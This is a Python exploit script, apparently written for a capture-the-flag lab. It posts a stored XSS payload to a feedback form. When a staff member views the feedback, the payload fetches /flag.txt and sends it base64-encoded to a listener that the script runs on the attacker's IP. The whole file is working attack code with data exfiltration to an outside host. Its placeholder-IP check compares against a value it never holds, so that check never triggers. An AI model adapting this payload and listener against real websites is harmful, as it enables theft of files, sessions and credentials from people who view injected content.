import requests
import threading
import base64
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

# --- CONFIGURATION ---
TARGET_URL = "http://[machine ip]:8080/submit_feedback"
YOUR_IP = ""  # <--- REPLACE with your local IP (check 'ip a' or 'ifconfig')
YOUR_PORT = 9001

# --- THE SERVER ---
class FlagHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        query_components = parse_qs(urlparse(self.path).query)
        if "flag" in query_components:
            encoded_flag = query_components["flag"][0]
            try:
                # Attempt to decode the base64 flag
                decoded_flag = base64.b64decode(encoded_flag).decode('utf-8')
                print(f"\n[!!!] FLAG RECEIVED: {decoded_flag}")
            except:
                print(f"\n[!] Data received (raw): {encoded_flag}")
            
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Success")
        else:
            self.send_response(200)
            self.end_headers()

    def log_message(self, format, *args):
        return # Keep the terminal clean

def start_server():
    server = HTTPServer(('0.0.0.0', YOUR_PORT), FlagHandler)
    print(f"[*] Local listener started on port {YOUR_PORT}...")
    server.serve_forever()

# --- THE EXPLOIT ---
def send_payload():
    # Constructing the XSS payload to hit your local IP
    xss_payload = f"""
    <script>
        fetch('/flag.txt')
        .then(r => r.text())
        .then(t => {{
            fetch('http://{YOUR_IP}:{YOUR_PORT}/?flag=' + btoa(t));
        }});
    </script>
    """
    
    print(f"[*] Sending payload to target...")
    try:
        requests.post(TARGET_URL, data={"feedback": xss_payload}, timeout=5)
        print("[+] Payload delivered. Waiting for 'staff' to view it...")
    except Exception as e:
        print(f"[-] Request failed: {e}")

if __name__ == "__main__":
    if YOUR_IP == "10.x.x.x":
        print("[-] Please edit the script and set YOUR_IP to your actual machine IP.")
    else:
        # Start the listener in a background thread
        threading.Thread(target=start_server, daemon=True).start()
        # Send the attack
        send_payload()
        # Keep the main thread alive to listen for the response
        try:
            while True: pass
        except KeyboardInterrupt:
            print("\n[*] Shutting down.")
